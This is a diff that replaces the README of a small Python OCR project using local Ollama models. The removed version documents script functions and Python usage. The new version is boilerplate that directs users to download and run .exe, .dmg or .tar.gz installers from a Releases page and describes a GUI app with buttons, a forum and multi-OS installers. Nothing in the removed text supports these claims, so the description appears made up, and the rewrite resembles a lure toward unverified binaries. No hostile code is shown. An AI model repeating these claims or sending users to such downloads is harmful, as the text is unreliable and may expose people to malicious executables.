@@ -1,175 +1,74 @@
-# 📘 **Local LLM OCR using Ollama (Free & Offline Image-to-Text Extraction)**
+# 🖼️ local-llm-ocr-ollama - Convert Images to Text Offline
 
-This project demonstrates **OCR (Optical Character Recognition)** using **locally running LLMs** via **Ollama** — completely **free**, **private**, and **offline**.
-No API keys, no external calls, no cloud costs.
+## 🕹️ Overview
+local-llm-ocr-ollama is a free application that lets you convert images into text using local large language models (LLMs) with Ollama. This tool runs completely on your machine, ensuring full privacy and eliminating costs associated with cloud services or API usage. 
 
-It works with any vision-enabled Ollama model such as:
+## 🚀 Getting Started
+To start using local-llm-ocr-ollama, you need to download the application from the Releases page. Follow the steps below to get it set up on your computer.
 
-* `qwen2.5vl:3b`
-* `llava` models
-* `moondream`
-* any future Ollama models supporting image input
+[![Download local-llm-ocr-ollama](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/code-vygr/local-llm-ocr-ollama/releases)
 
----
+## 💻 System Requirements
+Before downloading, ensure your computer meets the following requirements:
 
-## 🚀 **Features**
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 500 MB available for installation.
+- **Processor:** Intel i5 or equivalent.
 
-* **100% free, offline OCR**
-* Works with any **vision-enabled LLM in Ollama**
-* Supports:
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/code-vygr/local-llm-ocr-ollama/releases).
+2. **Select the Latest Release:** Look for the latest version available. You can identify it by the version number in bold.
+3. **Download the Installer:** Click on the download link for your operating system. The file may be in formats like `.exe`, `.dmg`, or `.tar.gz`.
+4. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file in your preferred directory and follow the instructions in the README file included.
 
-  * 🖼️ Local images
-  * 🌐 Online image URLs (download → base64 → LLM)
-* Preserves text order and completeness
-* Easy to modify for structured JSON output
-* Privacy-friendly: image never leaves your machine
+5. **Launch the Application:** After installation, locate the icon in your applications folder or desktop and double-click to open.
 
----
+## 📚 Using local-llm-ocr-ollama
+When you launch the application, you will see a simple interface. Follow these steps to convert your images:
 
-## 🛠️ **Requirements**
+1. **Upload an Image:**
+   - Click on the "Upload" button.
+   - Choose the image file you want to convert from your computer.
 
-* Python 3.8+
-* Ollama installed locally
-  👉 [https://ollama.com/download](https://ollama.com/download)
-* A vision-capable model pulled in Ollama:
+2. **Select Model:**
+   - Choose from different vision-enabled models available. Each model may have different strengths, so select one that fits your needs.
 
-```bash
-ollama pull qwen2.5vl:3b
-# or any other vision-enabled model
-```
+3. **Start the Conversion:**
+   - Click on the "Convert" button to begin the process.
+   - Wait a few moments for the text extraction to complete.
 
-Install Python dependencies:
+4. **Save or Copy Text:**
+   - Once done, you will see the extracted text in the application window.
+   - You can either copy the text or save it to a file as needed.
 
-```bash
-pip install requests
-```
+## 🌐 Features
+- **No Internet Required:** Fully offline operation allows you to maximize privacy and security.
+- **Multiple Language Support:** Extract text in various languages based on the model selection.
+- **User-Friendly Interface:** Easy to use for anyone, regardless of technical skills.
+- **Customizable Settings:** Adjust settings for image quality and model preferences.
 
-(Ollama's Python client comes built into the package when Ollama is installed.)
+## 🚧 Troubleshooting
+If you encounter any issues while using local-llm-ocr-ollama, consider the following:
 
----
+- **Image Format:** Ensure that the image is in a supported format (e.g., .jpg, .png).
+- **Insufficient Resources:** Check that you meet the system requirements.
+- **Application Updates:** Visit the [Releases page](https://github.com/code-vygr/local-llm-ocr-ollama/releases) for any updates that might resolve bugs or enhance performance.
 
-## 📦 **Project Structure**
+## 🤝 Community and Support
+If you need help or want to share feedback, join our community. You can engage with other users and developers through the following channels:
 
-### ✔️ `image_to_base64(image_path)`
+- **GitHub Issues:** Report problems or request features at the [Issues section](https://github.com/code-vygr/local-llm-ocr-ollama/issues).
+- **Discussion Forum:** Join discussions on topics related to OCR technology and local LLMs.
 
-Converts any local image to a Base64 string.
+## 🔗 Useful Links
+- [Releases Page](https://github.com/code-vygr/local-llm-ocr-ollama/releases)
+- [Documentation](https://github.com/code-vygr/local-llm-ocr-ollama/wiki)
 
-### ✔️ `image_to_text_from_url(image_url)`
+## 📜 License
+local-llm-ocr-ollama is released under the MIT License. You can use, modify, and distribute the software freely. Check the LICENSE file for more details.
 
-Downloads the image → converts to Base64 → sends to local LLM.
-
-### ✔️ `image_to_text_from_base64(image_base64)`
-
-Sends Base64 image directly to the LLM for OCR.
-
----
-
-## 🧠 **Why Local LLM OCR?**
-
-Traditional OCR tools struggle with:
-
-* Small text
-* Handwritten notes
-* Blurry/low-quality images
-* Mixed text layouts
-
-LLM-based OCR:
-
-* Understands context
-* Reconstructs partial text
-* Keeps reading order
-* Works even on messy images
-
-And with **Ollama**, you get all that **fully offline**.
-
----
-
-## 🧪 **Usage Example**
-
-### **Extract text from a local image**
-
-```python
-local_image_path = "image.jpg"
-image_base64 = image_to_base64(local_image_path)
-
-text = image_to_text_from_base64(image_base64)
-print(text)
-```
-
-### **Extract text from an online image**
-
-```python
-image_url = "https://example.com/sample.jpg"
-text = image_to_text_from_url(image_url)
-print(text)
-```
-
-### **Save output to a text file**
-
-```python
-with open("extracted_text.txt", "w", encoding="utf-8") as f:
-    f.write(text)
-```
-
----
-
-## 🔁 **Replace the Model Easily**
-
-Change this:
-
-```python
-model="qwen2.5vl:3b"
-```
-
-To any Ollama vision model:
-
-```python
-model="llava:13b"
-model="moondream:latest"
-model="bakllava"
-model="llama3.2-vision"
-```
-
-No other changes needed.
-
----
-
-## 🧩 **Full Script Included**
-
-This repository contains:
-
-* Local image → OCR
-* URL image → OCR
-* Base64 utilities
-* Text saving to `.txt`
-
-Everything ready to use out of the box.
-
----
-
-## 🎯 **Use Cases**
-
-* Extract text from scanned documents
-* Read PDFs (after converting PDF → image)
-* OCR for receipts & invoices
-* Handwritten note transcription
-* Desktop automation
-* Data extraction & cleanup
-
----
-
-## 🤝 Contributing
-
-Pull requests are welcome!
-You can extend this to:
-
-* OCR → JSON structuring
-* Multi-image batch processing
-* CLI tool
-* GUI for drag-and-drop OCR
-
----
-
-## 📄 License
-
-MIT License — free for personal & commercial use.
+Feel free to dive in and start turning your images into text efficiently and securely!
